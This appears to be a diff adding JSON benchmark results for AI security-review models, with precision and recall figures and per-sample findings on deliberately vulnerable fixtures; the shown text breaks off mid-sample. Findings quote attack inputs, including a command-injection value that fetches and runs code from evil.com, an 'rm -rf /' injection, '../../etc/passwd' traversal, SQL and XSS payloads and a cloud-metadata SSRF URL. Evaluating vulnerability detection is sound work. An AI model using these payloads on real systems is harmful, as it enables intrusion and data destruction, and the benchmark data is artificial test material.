@@ -1,0 +1,1534 @@
+{
+  "backend": "claude-code",
+  "context": "diff",
+  "corpus": {
+    "samples": 24,
+    "sha256": "fba95703f0830a08dc932ad8823b786349bc650cfe0e27fd1eff8aff8c52e6d7"
+  },
+  "generated_at": "2026-11-17T12:17:06.500441+00:00",
+  "models": {
+    "generator": "claude-sonnet-5",
+    "verifier": "claude-opus-4-8"
+  },
+  "modes": {
+    "generator_only": {
+      "calibration": {
+        "high": {
+          "correct": 4,
+          "findings": 5,
+          "precision": 0.8
+        },
+        "low": {
+          "correct": 1,
+          "findings": 14,
+          "precision": 0.0714
+        },
+        "medium": {
+          "correct": 9,
+          "findings": 23,
+          "precision": 0.3913
+        }
+      },
+      "metrics": {
+        "f1": 0.4912,
+        "false_positives_per_pr": 1.1667,
+        "fn": 1,
+        "fp": 28,
+        "precision": 0.3333,
+        "recall": 0.9333,
+        "samples": 24,
+        "tn": 3,
+        "tp": 14
+      }
+    },
+    "generator_plus_verifier": {
+      "calibration": {
+        "high": {
+          "correct": 12,
+          "findings": 15,
+          "precision": 0.8
+        },
+        "low": {
+          "correct": 0,
+          "findings": 3,
+          "precision": 0.0
+        },
+        "medium": {
+          "correct": 1,
+          "findings": 3,
+          "precision": 0.3333
+        }
+      },
+      "metrics": {
+        "f1": 0.7222,
+        "false_positives_per_pr": 0.3333,
+        "fn": 2,
+        "fp": 8,
+        "precision": 0.619,
+        "recall": 0.8667,
+        "samples": 24,
+        "tn": 6,
+        "tp": 13
+      }
+    }
+  },
+  "samples": [
+    {
+      "context_provided": false,
+      "cwe": "CWE-89",
+      "generator_only": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-89",
+          "description": "The find_user function builds a SQL query by directly concatenating the untrusted `username` parameter into the query string: `\"SELECT * FROM users WHERE username = '\" + username + \"'\"`. This allows an attacker to inject arbitrary SQL by supplying a crafted username (e.g. containing a single quote to break out of the string literal), potentially leading to authentication bypass, data exfiltration (reading other users' data), or data modification/deletion depending on how the result is used and what SQL features the underlying sqlite3 engine permits (e.g. UNION-based extraction, stacked queries if executemany/multiple statements are reachable). This is explicitly labeled in the code comment as a positive SQLi finding.",
+          "file": "app/users.py",
+          "hit": true,
+          "line": 16,
+          "remediation": "Use parameterized queries instead of string concatenation, e.g. `conn.execute(\"SELECT * FROM users WHERE username = ?\", (username,))`. Never interpolate user-controlled input directly into SQL strings.",
+          "severity": "critical",
+          "title": "SQL Injection in find_user via string concatenation"
+        }
+      ],
+      "id": "py-sqli-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-89",
+          "description": "The find_user function builds a SQL query by directly concatenating the untrusted `username` parameter into the query string: `\"SELECT * FROM users WHERE username = '\" + username + \"'\"`. This allows an attacker to inject arbitrary SQL by supplying a crafted username (e.g. containing a single quote to break out of the string literal), potentially leading to authentication bypass, data exfiltration (reading other users' data), or data modification/deletion depending on how the result is used and what SQL features the underlying sqlite3 engine permits (e.g. UNION-based extraction, stacked queries if executemany/multiple statements are reachable). This is explicitly labeled in the code comment as a positive SQLi finding.",
+          "file": "app/users.py",
+          "hit": true,
+          "line": 16,
+          "remediation": "Use parameterized queries instead of string concatenation, e.g. `conn.execute(\"SELECT * FROM users WHERE username = ?\", (username,))`. Never interpolate user-controlled input directly into SQL strings.",
+          "severity": "critical",
+          "title": "SQL Injection in find_user via string concatenation",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "The only things that could meaningfully alter exploitability (not correctness of the vuln): (1) every call site wrapping `username` in strict validation/allowlisting before reaching this function \u2014 but that would still leave the sink itself unsafe; (2) `username` being provably non-attacker-controlled in all reachable paths; (3) a surrounding import/shadowing of `get_connection`/`execute` that silently parameterizes \u2014 implausible given the shown definition returning a standard `sqlite3.connect`. None of these are present in the diff, and none would justify downgrading the finding below critical for the function as written.",
+            "rationale": "The diff itself is dispositive and leaves no room for a safety argument. `find_user` takes `username` and builds the query via raw string concatenation \u2014 `\"SELECT * FROM users WHERE username = '\" + username + \"'\"` \u2014 then passes the fully-assembled string to `conn.execute(query)`. This is the textbook unsafe path for sqlite3: `execute(sql)` with a single string argument performs no parameter binding, so there is no framework guarantee or implicit escaping to save it. The safe alternative (`conn.execute(\"... username = ?\", (username,))`) is conspicuously not used. I looked for the usual exonerating patterns and none apply: no parameterization, no escaping/quoting helper, no allowlist or type validation on `username`, and nothing in the function constrains the input to a safe shape. The attempted-disproof angles all fail \u2014 even if callers happened to sanitize today, the function is a public, reusable sink and the vulnerability is intrinsic to it. The in-code comment labeling it CWE-89 corroborates rather than contradicts the finding. Classic exploitable SQLi (auth bypass via `' OR '1'='1`, UNION-based exfiltration).",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [],
+      "id": "py-sqli-fp-trap",
+      "is_vulnerable": false,
+      "rejected": [],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-78",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-78",
+          "description": "The `run_backup` function concatenates the user-supplied `name` argument directly into a shell command string that is executed via `os.system()`. Because `os.system` invokes a shell, any shell metacharacters in `name` (e.g. `;`, `&&`, `|`, `$(...)`, backticks) will be interpreted by the shell rather than treated as a literal filename. This allows an attacker who controls `name` to execute arbitrary commands with the privileges of the process, e.g. `name = \"x; rm -rf / #\"` or `name = \"$(curl evil.com/x|sh)\"`. This is a textbook CWE-78 OS Command Injection.",
+          "file": "app/cmdi_positive.py",
+          "hit": true,
+          "line": 7,
+          "remediation": "Avoid building shell command strings from untrusted input. Use `subprocess.run([...], shell=False)` with an argument list (e.g. `subprocess.run([\"tar\", \"czf\", f\"/backups/{name}.tgz\", \"/data\"])`), and additionally validate/whitelist `name` (e.g. restrict to alphanumeric characters) to prevent path traversal or injection of unexpected tar arguments. Never pass untrusted input through `os.system` or `shell=True`.",
+          "severity": "critical",
+          "title": "OS Command Injection via unsanitized `name` parameter in run_backup()"
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-22",
+          "description": "In addition to command injection, `name` is concatenated directly into a filesystem path (`/backups/<name>.tgz`) without validation. Even if command injection were mitigated, an attacker-controlled `name` containing path traversal sequences (e.g. `../../etc/cron.d/evil`) could cause the backup archive to be written outside the intended `/backups/` directory, potentially overwriting arbitrary files.",
+          "file": "app/cmdi_positive.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Validate and sanitize `name` to disallow path separators and traversal sequences (e.g. enforce a strict allow-list regex such as `^[A-Za-z0-9_-]+$`) before using it to construct filesystem paths, and resolve/normalize the final path to confirm it remains within the intended backup directory.",
+          "severity": "high",
+          "title": "Path traversal / arbitrary file write via unsanitized `name` in backup path construction"
+        }
+      ],
+      "id": "py-cmdi-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-78",
+          "description": "The `run_backup` function concatenates the user-supplied `name` argument directly into a shell command string that is executed via `os.system()`. Because `os.system` invokes a shell, any shell metacharacters in `name` (e.g. `;`, `&&`, `|`, `$(...)`, backticks) will be interpreted by the shell rather than treated as a literal filename. This allows an attacker who controls `name` to execute arbitrary commands with the privileges of the process, e.g. `name = \"x; rm -rf / #\"` or `name = \"$(curl evil.com/x|sh)\"`. This is a textbook CWE-78 OS Command Injection.",
+          "file": "app/cmdi_positive.py",
+          "hit": true,
+          "line": 7,
+          "remediation": "Avoid building shell command strings from untrusted input. Use `subprocess.run([...], shell=False)` with an argument list (e.g. `subprocess.run([\"tar\", \"czf\", f\"/backups/{name}.tgz\", \"/data\"])`), and additionally validate/whitelist `name` (e.g. restrict to alphanumeric characters) to prevent path traversal or injection of unexpected tar arguments. Never pass untrusted input through `os.system` or `shell=True`.",
+          "severity": "critical",
+          "title": "OS Command Injection via unsanitized `name` parameter in run_backup()",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "The assessment could soften only if every caller of run_backup were shown to pass a hard-coded or strictly validated (allow-listed) `name` that cannot contain shell metacharacters, making the input non-attacker-controlled in practice. Even then the function would remain latently unsafe. Given the file is a deliberately labeled positive test fixture, this is moot.",
+            "rationale": "The code is fully self-contained in the diff and leaves no room for an exculpatory interpretation. `os.system()` executes its argument through a shell (`/bin/sh -c`), and the `name` parameter is concatenated raw into that command string with no quoting, escaping, allow-listing, or validation of any kind. There is no `shlex.quote`, no argument-list exec (which would avoid the shell), and no framework layer intercepting the value. Any shell metacharacter in `name` (`;`, `&&`, `|`, `$()`, backticks) breaks out of the intended `tar` invocation \u2014 e.g. `name = \"x; rm -rf / #\"`. I attempted to disprove the finding by looking for parameterization or a trusted-source guarantee for `name`, but `run_backup` accepts `name` as an open parameter with no narrowing, and the file itself is explicitly authored as a positive CWE-78 example. Nothing in the change mitigates the injection. CWE-78 and critical severity are correct.",
+            "upheld": true
+          }
+        },
+        {
+          "confidence": "medium",
+          "cwe": "CWE-22",
+          "description": "In addition to command injection, `name` is concatenated directly into a filesystem path (`/backups/<name>.tgz`) without validation. Even if command injection were mitigated, an attacker-controlled `name` containing path traversal sequences (e.g. `../../etc/cron.d/evil`) could cause the backup archive to be written outside the intended `/backups/` directory, potentially overwriting arbitrary files.",
+          "file": "app/cmdi_positive.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Validate and sanitize `name` to disallow path separators and traversal sequences (e.g. enforce a strict allow-list regex such as `^[A-Za-z0-9_-]+$`) before using it to construct filesystem paths, and resolve/normalize the final path to confirm it remains within the intended backup directory.",
+          "severity": "high",
+          "title": "Path traversal / arbitrary file write via unsanitized `name` in backup path construction",
+          "verdict": {
+            "confidence": "medium",
+            "context_that_would_change_this": "Whether all call sites of run_backup() validate/allowlist `name` upstream (e.g., restrict to a known set of backup names) before invocation; and whether this file is purely a synthetic benchmark fixture never wired to untrusted input, in which case the secondary CWE-22 is academic. Confirming the command-injection remediation path (e.g., a move to subprocess with shell=False) would also clarify how material the residual traversal risk is.",
+            "rationale": "The finding is technically correct and could not be disproven. `name` is concatenated directly into the path `/backups/<name>.tgz` with no validation, normalization, or `basename()` stripping, so a value like `../../etc/cron.d/evil` escapes the intended directory. The trailing `.tgz` suffix narrows exploitation (only `*.tgz` targets can be overwritten) but does not prevent the directory escape, so no parameterization or framework guarantee rescues the code. Confidence is medium rather than high because (a) the path traversal is largely subsumed by the far more severe command injection the file is explicitly built to demonstrate \u2014 an attacker with shell injection needs no traversal \u2014 and (b) the description's \"arbitrary files\" is an overstatement given the forced `.tgz` suffix.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-22",
+          "description": "The `name` argument is interpolated directly into a filesystem path (`f\"/backups/{name}.tgz\"`) without validation or sanitization. Although `shell=False` with a list of arguments correctly prevents shell metacharacter/command injection, `tar` itself will still honor path traversal sequences in the destination filename. If `name` is attacker-controlled (e.g., contains `../../` sequences or an absolute-path-like value), the resulting archive could be written outside the intended `/backups` directory, potentially overwriting arbitrary files the process has write access to (e.g., cron files, application configs, or other sensitive paths). This is a distinct vulnerability class (path traversal) from command injection and is not mitigated by the shell=False protection that the comment focuses on.",
+          "file": "app/cmdi_fp_trap.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Validate/sanitize `name` before use: restrict to a safe allow-list pattern (e.g., `^[A-Za-z0-9_-]+$`), reject any path separators or '..' sequences, or use `os.path.basename(name)` combined with resolving the final path and verifying it stays within the intended backup directory (e.g., via `os.path.realpath` and a prefix check) before passing it to `subprocess.run`.",
+          "severity": "medium",
+          "title": "Unsanitized 'name' parameter allows path traversal in backup filename"
+        }
+      ],
+      "id": "py-cmdi-fp-trap",
+      "is_vulnerable": false,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "low",
+          "cwe": "CWE-22",
+          "description": "The `name` argument is interpolated directly into a filesystem path (`f\"/backups/{name}.tgz\"`) without validation or sanitization. Although `shell=False` with a list of arguments correctly prevents shell metacharacter/command injection, `tar` itself will still honor path traversal sequences in the destination filename. If `name` is attacker-controlled (e.g., contains `../../` sequences or an absolute-path-like value), the resulting archive could be written outside the intended `/backups` directory, potentially overwriting arbitrary files the process has write access to (e.g., cron files, application configs, or other sensitive paths). This is a distinct vulnerability class (path traversal) from command injection and is not mitigated by the shell=False protection that the comment focuses on.",
+          "file": "app/cmdi_fp_trap.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Validate/sanitize `name` before use: restrict to a safe allow-list pattern (e.g., `^[A-Za-z0-9_-]+$`), reject any path separators or '..' sequences, or use `os.path.basename(name)` combined with resolving the final path and verifying it stays within the intended backup directory (e.g., via `os.path.realpath` and a prefix check) before passing it to `subprocess.run`.",
+          "severity": "medium",
+          "title": "Unsanitized 'name' parameter allows path traversal in backup filename",
+          "verdict": {
+            "confidence": "low",
+            "context_that_would_change_this": "Call sites of run_backup() showing where `name` originates. If `name` is derived from a hardcoded value, enum, or an already-sanitized/validated token (e.g. basename-only, regex-restricted identifier), the finding collapses to a non-issue. Conversely, a call site passing an HTTP/request-derived value would raise this to a confirmed, higher-severity issue. Also relevant: whether the process actually has write access outside /backups and whether /backups exists (tar would fail on a nonexistent parent, limiting pure-traversal cases but not absolute-path-style escapes).",
+            "rationale": "The finding correctly avoids the command-injection trap (shell=False + list args genuinely prevents shell injection) and identifies a legitimately distinct code pattern: `name` is interpolated into `/backups/{name}.tgz` with no validation, normalization, or basename extraction, and `tar` does honor `../` / absolute-style traversal in the destination path. The mechanism is technically accurate and I cannot disprove it from the available code \u2014 there is no sanitization anywhere in the visible function. However, the finding's exploitability rests entirely on the unproven assumption that `name` is attacker-controlled. This is a new standalone function with no call sites in the diff, so untrusted-source-to-sink reachability is not demonstrated. The finding itself hedges with 'If `name` is attacker-controlled.' Because the pattern is real and unsanitized but reachability is unestablished (and this is a synthetic fp-trap file), I uphold at low confidence rather than reject.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-22",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-22",
+          "description": "The read_report function concatenates user-supplied `filename` directly onto the base path \"/var/reports/\" without any validation, normalization, or sanitization. An attacker can supply a value such as \"../../etc/passwd\" or an absolute-path-like sequence to escape the intended /var/reports/ directory and read arbitrary files on the filesystem that the running process has permission to access. This is a classic CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) / CWE-73 (External Control of File Name or Path) vulnerability, explicitly labeled as a positive test case in the code comment. If this function is reachable from any external input (HTTP request parameter, API, etc.), it results in arbitrary file disclosure.",
+          "file": "app/path_traversal_positive.py",
+          "hit": true,
+          "line": 4,
+          "remediation": "Do not build file paths via naive string concatenation with user input. Use os.path.join combined with os.path.realpath/os.path.abspath to resolve the final path, then verify (e.g., via os.path.commonpath or startswith check on the resolved path) that it still resides inside the intended base directory (e.g., /var/reports/). Reject filenames containing path separators, '..' segments, or null bytes; prefer allow-listing filenames against a known set of valid report identifiers rather than accepting arbitrary strings.",
+          "severity": "high",
+          "title": "Path traversal via unsanitized filename parameter in read_report()"
+        }
+      ],
+      "id": "py-path-traversal-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-22",
+          "description": "The read_report function concatenates user-supplied `filename` directly onto the base path \"/var/reports/\" without any validation, normalization, or sanitization. An attacker can supply a value such as \"../../etc/passwd\" or an absolute-path-like sequence to escape the intended /var/reports/ directory and read arbitrary files on the filesystem that the running process has permission to access. This is a classic CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) / CWE-73 (External Control of File Name or Path) vulnerability, explicitly labeled as a positive test case in the code comment. If this function is reachable from any external input (HTTP request parameter, API, etc.), it results in arbitrary file disclosure.",
+          "file": "app/path_traversal_positive.py",
+          "hit": true,
+          "line": 4,
+          "remediation": "Do not build file paths via naive string concatenation with user input. Use os.path.join combined with os.path.realpath/os.path.abspath to resolve the final path, then verify (e.g., via os.path.commonpath or startswith check on the resolved path) that it still resides inside the intended base directory (e.g., /var/reports/). Reject filenames containing path separators, '..' segments, or null bytes; prefer allow-listing filenames against a known set of valid report identifiers rather than accepting arbitrary strings.",
+          "severity": "high",
+          "title": "Path traversal via unsanitized filename parameter in read_report()",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence on reachability/exploitability of impact (not of the code-level flaw): the call sites of read_report(). If every caller passes only a hard-coded/validated/allow-listed filename (e.g., values already run through os.path.basename or matched against a fixed set), the real-world risk would drop to defense-in-depth. Conversely, a call site wiring `filename` to an HTTP/API parameter confirms full exploitability. Also relevant: any upstream middleware/decorator that sanitizes the argument before it reaches this function.",
+            "rationale": "The code performs `open(\"/var/reports/\" + filename)` with zero sanitization, normalization, or containment of the user-supplied `filename`. I could not find any mitigation: no `os.path.basename`/`normpath`/`realpath` prefix check, no allow-list, no `..` rejection, and no framework layer constraining the input. Python's `open()` provides no base-directory confinement, so `../../etc/passwd` (or symlink/absolute traversal) escapes `/var/reports/`. The code is intentionally labeled a positive CWE-22 test case, confirming the pattern rather than refuting it. The finding correctly describes a genuine path-traversal/arbitrary-file-read vulnerability at the code level.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-502",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-502",
+          "description": "The load_session function passes externally-supplied bytes directly to pickle.loads(). Python's pickle module is not safe against maliciously constructed data; unpickling untrusted input can execute arbitrary code via objects implementing __reduce__/__setstate__, leading to remote code execution. The code is explicitly labeled as a positive test case for this issue, confirming the intent, but if ever wired into a real request path (e.g., deserializing session blobs from cookies or network input), this would be directly exploitable.",
+          "file": "app/pickle_deser_positive.py",
+          "hit": true,
+          "line": null,
+          "remediation": "Avoid pickle for untrusted data entirely. Use a safe serialization format such as JSON (or a signed/encrypted token format like itsdangerous) for session data. If a custom binary format is required, implement a restricted unpickler that whitelists allowed classes, or cryptographically sign/verify the blob before deserializing and only deserialize data from trusted sources.",
+          "severity": "critical",
+          "title": "Insecure deserialization of untrusted data via pickle.loads"
+        }
+      ],
+      "id": "py-pickle-deser-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-502",
+          "description": "The load_session function passes externally-supplied bytes directly to pickle.loads(). Python's pickle module is not safe against maliciously constructed data; unpickling untrusted input can execute arbitrary code via objects implementing __reduce__/__setstate__, leading to remote code execution. The code is explicitly labeled as a positive test case for this issue, confirming the intent, but if ever wired into a real request path (e.g., deserializing session blobs from cookies or network input), this would be directly exploitable.",
+          "file": "app/pickle_deser_positive.py",
+          "hit": true,
+          "line": null,
+          "remediation": "Avoid pickle for untrusted data entirely. Use a safe serialization format such as JSON (or a signed/encrypted token format like itsdangerous) for session data. If a custom binary format is required, implement a restricted unpickler that whitelists allowed classes, or cryptographically sign/verify the blob before deserializing and only deserialize data from trusted sources.",
+          "severity": "critical",
+          "title": "Insecure deserialization of untrusted data via pickle.loads",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Confirmation that this file is pure scanner-bait/test fixture never imported by any runtime path, or that all callers only ever pass locally-generated trusted bytes, would lower the practical exploitability (but not the correctness of the CWE-502 classification).",
+            "rationale": "The code passes attacker-controllable bytes directly to pickle.loads() with no restricted unpickler, signature/HMAC verification, class allow-list, or safe-format alternative. This is a canonical CWE-502 RCE primitive and could not be disproved \u2014 no parameterization or framework guarantee mitigates it. The finding's own reasoning is sound and the code pattern is unambiguously unsafe.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-327",
+      "generator_only": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-327",
+          "description": "The hash_password function uses hashlib.md5 to hash passwords. MD5 is cryptographically broken, extremely fast (making brute-force/dictionary attacks cheap), and the implementation uses no per-user salt and no key-stretching/work factor. This makes stored password hashes vulnerable to rainbow-table and brute-force attacks if the hash database is ever leaked.",
+          "file": "app/weak_crypto_positive.py",
+          "hit": true,
+          "line": 7,
+          "remediation": "Use a dedicated password hashing algorithm with built-in salting and adjustable work factor, such as bcrypt, scrypt, Argon2, or PBKDF2-HMAC with a high iteration count (e.g., via passlib, bcrypt, or hashlib.pbkdf2_hmac/hashlib.scrypt). Never use general-purpose fast hash functions (MD5, SHA1, SHA256 alone) for password storage.",
+          "severity": "high",
+          "title": "Use of MD5 for password hashing"
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-759",
+          "description": "In addition to using a weak hash algorithm, the function does not incorporate any per-password random salt, making identical passwords produce identical hashes and enabling precomputed rainbow-table attacks across the user base.",
+          "file": "app/weak_crypto_positive.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Always generate a unique, cryptographically random salt per password and store it alongside the hash, or use a password hashing library (bcrypt/Argon2) that manages salting internally.",
+          "severity": "medium",
+          "title": "Missing salt in password hashing scheme"
+        }
+      ],
+      "id": "py-weak-crypto-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-327",
+          "description": "The hash_password function uses hashlib.md5 to hash passwords. MD5 is cryptographically broken, extremely fast (making brute-force/dictionary attacks cheap), and the implementation uses no per-user salt and no key-stretching/work factor. This makes stored password hashes vulnerable to rainbow-table and brute-force attacks if the hash database is ever leaked.",
+          "file": "app/weak_crypto_positive.py",
+          "hit": true,
+          "line": 7,
+          "remediation": "Use a dedicated password hashing algorithm with built-in salting and adjustable work factor, such as bcrypt, scrypt, Argon2, or PBKDF2-HMAC with a high iteration count (e.g., via passlib, bcrypt, or hashlib.pbkdf2_hmac/hashlib.scrypt). Never use general-purpose fast hash functions (MD5, SHA1, SHA256 alone) for password storage.",
+          "severity": "high",
+          "title": "Use of MD5 for password hashing",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "A call site demonstrating that hash_password is never applied to real credentials (e.g., used only for non-sensitive fingerprinting/deduplication despite its name), or a surrounding wrapper that adds a per-user salt and a proper KDF (bcrypt/scrypt/argon2/PBKDF2) before storing the value, would lower the severity or make it a false positive.",
+            "rationale": "The code is a direct, self-contained password-hashing function that returns hashlib.md5(password.encode()).hexdigest() with no salt, no key-stretching, and no work factor. All standard false-positive defenses fail: the function name (hash_password), parameter (password: str), and comment confirm it is used for credentials rather than a benign checksum; there is no wrapping KDF, HMAC key, or framework guarantee anywhere in the 7-line file. MD5 as a bare, unsalted password digest is the canonical CWE-327 weakness and is correctly flagged as high severity.",
+            "upheld": true
+          }
+        },
+        {
+          "confidence": "high",
+          "cwe": "CWE-759",
+          "description": "In addition to using a weak hash algorithm, the function does not incorporate any per-password random salt, making identical passwords produce identical hashes and enabling precomputed rainbow-table attacks across the user base.",
+          "file": "app/weak_crypto_positive.py",
+          "hit": false,
+          "line": 7,
+          "remediation": "Always generate a unique, cryptographically random salt per password and store it alongside the hash, or use a password hashing library (bcrypt/Argon2) that manages salting internally.",
+          "severity": "medium",
+          "title": "Missing salt in password hashing scheme",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "If callers never use this for actual credential storage (e.g., it is a deliberately-planted test/benchmark fixture \u2014 the filename `weak_crypto_positive.py` suggests a vulnerability test corpus), the real-world exploitability is nil even though the code-level finding remains technically correct. Evidence that the digest is only ever compared against other salted/peppered material downstream, or that the function is dead/test-only code, would lower practical severity.",
+            "rationale": "The entire file is visible and self-contained. `hashlib.md5(password.encode()).hexdigest()` hashes only the raw password bytes with no salt argument, module-level pepper, or concatenation. The hash is deterministic, so identical passwords produce identical digests, enabling precomputed rainbow-table attacks \u2014 precisely CWE-759. No parameterization, caller, or framework guarantee can introduce per-password random salt into a function whose output is a pure deterministic digest of the password alone. The author's own comment and the `hash_password` name confirm this is password hashing and acknowledge it is unsalted. The missing-salt finding is distinct from and additive to the weak-algorithm concern, so it stands on its own.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [],
+      "id": "py-weak-crypto-fp-trap",
+      "is_vulnerable": false,
+      "rejected": [],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-79",
+      "generator_only": [
+        {
+          "confidence": "medium",
+          "cwe": "CWE-79",
+          "description": "The `render` function takes a `comment` parameter (presumably derived from user-controlled input, such as a stored or submitted comment) and assigns it directly to `document.getElementById(\"out\").innerHTML`. Since `innerHTML` parses its string argument as HTML, any HTML/JavaScript contained in `comment` (e.g. `<img src=x onerror=...>` or `<script>` tags, though script tags inserted via innerHTML don't execute, event-handler-based payloads do) will be parsed and executed in the context of the page. If `comment` originates from another user (e.g., a stored comment system) this is a classic stored/reflected Cross-Site Scripting (XSS) vulnerability, allowing an attacker to execute arbitrary JavaScript in victims' browsers, steal session tokens/cookies, perform actions on behalf of the user, or deface the page.",
+          "file": "src/xss_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Avoid assigning untrusted data to innerHTML. Use `textContent` (or `innerText`) when inserting plain text, e.g. `document.getElementById(\"out\").textContent = comment;`. If HTML rendering is required, sanitize the input with a vetted library such as DOMPurify before insertion, and apply a strict Content-Security-Policy as defense in depth.",
+          "severity": "high",
+          "title": "Untrusted comment content assigned to innerHTML causes DOM-based XSS"
+        }
+      ],
+      "id": "js-xss-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-79",
+          "description": "The `render` function takes a `comment` parameter (presumably derived from user-controlled input, such as a stored or submitted comment) and assigns it directly to `document.getElementById(\"out\").innerHTML`. Since `innerHTML` parses its string argument as HTML, any HTML/JavaScript contained in `comment` (e.g. `<img src=x onerror=...>` or `<script>` tags, though script tags inserted via innerHTML don't execute, event-handler-based payloads do) will be parsed and executed in the context of the page. If `comment` originates from another user (e.g., a stored comment system) this is a classic stored/reflected Cross-Site Scripting (XSS) vulnerability, allowing an attacker to execute arbitrary JavaScript in victims' browsers, steal session tokens/cookies, perform actions on behalf of the user, or deface the page.",
+          "file": "src/xss_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Avoid assigning untrusted data to innerHTML. Use `textContent` (or `innerText`) when inserting plain text, e.g. `document.getElementById(\"out\").textContent = comment;`. If HTML rendering is required, sanitize the input with a vetted library such as DOMPurify before insertion, and apply a strict Content-Security-Policy as defense in depth.",
+          "severity": "high",
+          "title": "Untrusted comment content assigned to innerHTML causes DOM-based XSS",
+          "verdict": {
+            "confidence": "high",
+            "context_that_would_change_this": "Evidence that would weaken the finding: (1) all call sites of `render()` pass only sanitized/escaped values or values run through DOMPurify before the call; (2) a page-wide Content-Security-Policy with Trusted Types (`require-trusted-types-for 'script'`) that would block raw string assignment to innerHTML; or (3) `comment` being provably developer-controlled constant data rather than user input. Without seeing callers or CSP config, the safest assessment is that this exported function accepts arbitrary untrusted strings and is exploitable.",
+            "rationale": "The code assigns the `comment` parameter directly to `document.getElementById(\"out\").innerHTML` with no sanitization, encoding, or templating framework in between. innerHTML parses the string as HTML, so an attacker-controlled comment containing event-handler payloads (e.g. `<img src=x onerror=...>`) executes in the victim's browser \u2014 a textbook DOM-based/stored XSS (CWE-79). I attempted to disprove the finding by looking for mitigating context: there is no DOMPurify/sanitizer call, no `textContent` usage, no trusted-types enforcement visible, and the `render` function is an exported public API with no restriction on the caller's input. The parameter name, comment, and filename all indicate untrusted user content. No framework auto-escaping applies because this is raw DOM manipulation. I could not find any parameterization or validation that would make this safe.",
+            "upheld": true
+          }
+        }
+      ]
+    },
+    {
+      "context_provided": false,
+      "cwe": null,
+      "generator_only": [],
+      "id": "js-xss-fp-trap",
+      "is_vulnerable": false,
+      "rejected": [],
+      "upheld": []
+    },
+    {
+      "context_provided": false,
+      "cwe": "CWE-918",
+      "generator_only": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-918",
+          "description": "The fetchAvatar function takes a user-controlled `userUrl` parameter and passes it directly to fetch() with no validation, scheme restriction, or allowlisting. An attacker can supply arbitrary URLs (e.g., http://169.254.169.254/latest/meta-data/ for cloud metadata services, internal/private IP ranges, localhost, or non-HTTP schemes like file:// depending on the fetch implementation) causing the server to make requests on the attacker's behalf. This can lead to disclosure of internal network topology, access to internal-only services/metadata (including cloud credentials), port scanning of internal hosts, or interaction with internal APIs that are not meant to be internet-reachable.",
+          "file": "src/ssrf_positive.js",
+          "hit": true,
+          "line": 4,
+          "remediation": "Validate and restrict the target URL before fetching: enforce an allowlist of permitted domains/hosts, restrict to https scheme only, resolve the hostname and reject private/loopback/link-local/metadata IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7, etc.), disable redirects or re-validate the final URL after redirects, and consider proxying the request through a dedicated egress service with strict network-level controls (e.g., a firewall that blocks requests to internal address space).",
+          "severity": "high",
+          "title": "Server-Side Request Forgery via unvalidated user-supplied URL"
+        }
+      ],
+      "id": "js-ssrf-positive",
+      "is_vulnerable": true,
+      "rejected": [],
+      "upheld": [
+        {
+          "confidence": "high",
+          "cwe": "CWE-918",
+          "description": "The fetchAvatar function takes a user-controlled `userUrl` parameter and passes it directly to fetch() with no validation, scheme restriction, or allowlisting. An attacker can supply arbitrary URLs (e.g., http://169.254.169.254/latest/meta-data/ for cloud metadata services, internal/private IP ranges, localhost, or non-HTTP schemes like file:// depending on the fetch implementation) causing the server to make requests on the attacker's behalf. This can lead to disclosure of internal network topology, access to internal-only services/metadata (including cloud credentials), port scanning of internal hosts, or interaction with internal APIs that are not meant to be internet-reachable.",
